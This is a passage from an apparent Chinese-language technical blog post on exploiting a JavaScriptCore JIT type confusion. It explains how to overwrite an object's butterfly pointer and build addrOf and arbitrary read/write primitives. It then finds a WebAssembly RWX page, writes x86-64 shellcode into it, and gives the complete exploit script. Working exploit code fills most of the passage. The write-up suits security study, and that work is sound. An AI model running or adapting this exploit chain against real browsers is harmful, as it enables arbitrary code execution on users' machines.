<p>a2 和 a3 对象内存上是紧邻的，a2 有两个内联属性，占用 0x10 个字节的空间，再往后就是 a3 的 JSCell 字段和 butterfly 字段，那么这个 poc 的目的就是将 a3 的 butterfly 指针修改成 a4 对象的地址</p>
<p><strong>注意：经过测试，对象的地址貌似都是 16 字节对齐的，构造紧邻的对象要注意内存对齐产生的空隙</strong></p>
<p><strong>那么这之后，<code>a3[1]</code> 就指向了 a4 的 butterfly 字段了，可以修改这个对象进行任意地址读写，同时 <code>a3[2]</code> 就指向了 a4 的第一个内联属性，也就是属性 a，可以进行类型混淆泄露地址</strong></p>
<h3 id="addrOf"><a href="#addrOf" class="headerlink" title="addrOf"></a>addrOf</h3><p>利用 <code>a3[2]</code> 和 <code>a4.a</code> 进行任意对象地址泄露</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	a4<span class="token punctuation">.</span>a <span class="token operator">=</span> obj<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>a3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意：因为 a3 对象创建的时候，0，1 下标都是 double 数值，那么它的类型必定被初始化为 <strong>xxxWithDouble</strong>，那么存取数组的值的时候都是 unboxed 的，那么就不用考虑编码问题了</p>
<h3 id="ARW"><a href="#ARW" class="headerlink" title="ARW"></a>ARW</h3><p>利用 <code>a3[1]</code> 修改 a4 的 butterfly 字段即可进行任意地址读写，<strong>但是要注意的是地址 -8 偏移处对应的是数组长度和空间大小，不能为 0</strong></p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">arbRead</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ((*(addr - 8)) >> 32) > 0</span>
	a3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// &lt;-- butterfly</span>
	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>a4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">arbWrite</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ((*(addr - 8)) >> 32) > 0</span>
	a3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	a4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>jsc 和 v8 一样，wasm 同样使用 rwx 权限的段来存放运行的机器码，先找出这个 rwx 权限的地址：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> func <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>

<span class="token function">debug</span><span class="token punctuation">(</span><span class="token function">describe</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在 funtion 对象 +0x38 偏移处发现这个地址：<br><img src="/images/a50bb9a6/13.png" alt="rwx"></p>
<p>这个地址并不是 rwx 段的起始地址，但这确实是这个 wasm 函数对象的调用的地址，幸运的是，-8 偏移处填满了 0xcc，完全符合任意读写的条件：<br><img src="/images/a50bb9a6/14.png" alt="rwx"></p>
<p>接下来写入 shellcode：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> func_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> rwx_addr <span class="token operator">=</span> <span class="token function">arbRead</span><span class="token punctuation">(</span>func_addr <span class="token operator">+</span> <span class="token number">0x38n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x10101010101b848n</span><span class="token punctuation">,</span>    <span class="token number">0x62792eb848500101n</span><span class="token punctuation">,</span>    <span class="token number">0x431480101626d60n</span><span class="token punctuation">,</span>    <span class="token number">0x2f7273752fb84824n</span><span class="token punctuation">,</span>
    <span class="token number">0x48e78948506e6962n</span><span class="token punctuation">,</span>    <span class="token number">0x1010101010101b8n</span><span class="token punctuation">,</span>    <span class="token number">0x6d606279b8485001n</span><span class="token punctuation">,</span>    <span class="token number">0x2404314801010162n</span><span class="token punctuation">,</span>
    <span class="token number">0x1485e086a56f631n</span><span class="token punctuation">,</span>    <span class="token number">0x313b68e6894856e6n</span><span class="token punctuation">,</span>    <span class="token number">0x101012434810101n</span><span class="token punctuation">,</span>    <span class="token number">0x4c50534944b84801n</span><span class="token punctuation">,</span>
    <span class="token number">0x6a52d231503d5941n</span><span class="token punctuation">,</span>    <span class="token number">0x894852e201485a08n</span><span class="token punctuation">,</span>    <span class="token number">0x50f583b6ae2n</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>

a3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>rwx_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	a4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// pwn!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>shellcode 效果是弹计算器：<br><img src="/images/a50bb9a6/15.png" alt="pwn"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>完整 exp 如下：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// utils ------</span>
<span class="token keyword">let</span> <span class="token punctuation">[</span>f2i<span class="token punctuation">,</span> i2f<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">let</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> floatArr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> intArr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">let</span> <span class="token function-variable function">f2i</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>floatArr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v<span class="token punctuation">;</span> <span class="token keyword">return</span> intArr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> <span class="token function-variable function">i2f</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>intArr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v<span class="token punctuation">;</span> <span class="token keyword">return</span> floatArr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
	
	<span class="token keyword">return</span> <span class="token punctuation">[</span>f2i<span class="token punctuation">,</span> i2f<span class="token punctuation">]</span><span class="token punctuation">;</span>
	
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">getWasm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">let</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">let</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> f <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>
	
	<span class="token keyword">return</span> <span class="token punctuation">[</span>wasmInstance<span class="token punctuation">,</span> f<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// ------</span>

<span class="token keyword">var</span> a1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">2.2</span><span class="token punctuation">,</span> c<span class="token operator">:</span><span class="token number">3.3</span><span class="token punctuation">,</span> d<span class="token operator">:</span><span class="token number">4.4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> a2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">2.2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> a3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">:</span><span class="token number">3.3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">:</span><span class="token number">4.4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> a4 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">:</span><span class="token number">3.3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">:</span><span class="token number">4.4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	obj<span class="token punctuation">.</span>d <span class="token operator">=</span> value<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">foo</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">// debug(describe(a2));</span>
<span class="token comment">// debug(describe(a3));</span>
<span class="token comment">// debug(describe(a4));</span>

<span class="token function">foo</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> a4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// a3 --> butterfly = addrOf(a4)</span>

<span class="token comment">// print(1.1);</span>

<span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	a4<span class="token punctuation">.</span>a <span class="token operator">=</span> obj<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>a3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">arbRead</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ((*(addr - 8)) >> 32) > 0</span>
	a3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// &lt;-- butterfly</span>
	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>a4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">arbWrite</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ((*(addr - 8)) >> 32) > 0</span>
	a3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	a4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/*
let test_obj = &#123;&#125;;
let test_addr = addrOf(test_obj) - 0x38n;
debug(describe(test_obj));
debug(`test_addr = 0x$&#123;test_addr.toString(16)&#125;`);
let value = arbRead(test_addr);
debug(`value = 0x$&#123;value.toString(16)&#125;`);
*/</span>


<span class="token keyword">let</span> <span class="token punctuation">[</span>instance<span class="token punctuation">,</span> func<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getWasm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//debug(describe(func));</span>
<span class="token keyword">let</span> func_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">func_addr = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>func_addr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> rwx_addr <span class="token operator">=</span> <span class="token function">arbRead</span><span class="token punctuation">(</span>func_addr <span class="token operator">+</span> <span class="token number">0x38n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">rwx_addr = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>rwx_addr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x10101010101b848n</span><span class="token punctuation">,</span>    <span class="token number">0x62792eb848500101n</span><span class="token punctuation">,</span>    <span class="token number">0x431480101626d60n</span><span class="token punctuation">,</span>    <span class="token number">0x2f7273752fb84824n</span><span class="token punctuation">,</span>
    <span class="token number">0x48e78948506e6962n</span><span class="token punctuation">,</span>    <span class="token number">0x1010101010101b8n</span><span class="token punctuation">,</span>    <span class="token number">0x6d606279b8485001n</span><span class="token punctuation">,</span>    <span class="token number">0x2404314801010162n</span><span class="token punctuation">,</span>
    <span class="token number">0x1485e086a56f631n</span><span class="token punctuation">,</span>    <span class="token number">0x313b68e6894856e6n</span><span class="token punctuation">,</span>    <span class="token number">0x101012434810101n</span><span class="token punctuation">,</span>    <span class="token number">0x4c50534944b84801n</span><span class="token punctuation">,</span>
    <span class="token number">0x6a52d231503d5941n</span><span class="token punctuation">,</span>    <span class="token number">0x894852e201485a08n</span><span class="token punctuation">,</span>    <span class="token number">0x50f583b6ae2n</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>

a3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>rwx_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	a4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//print(1.1);</span>
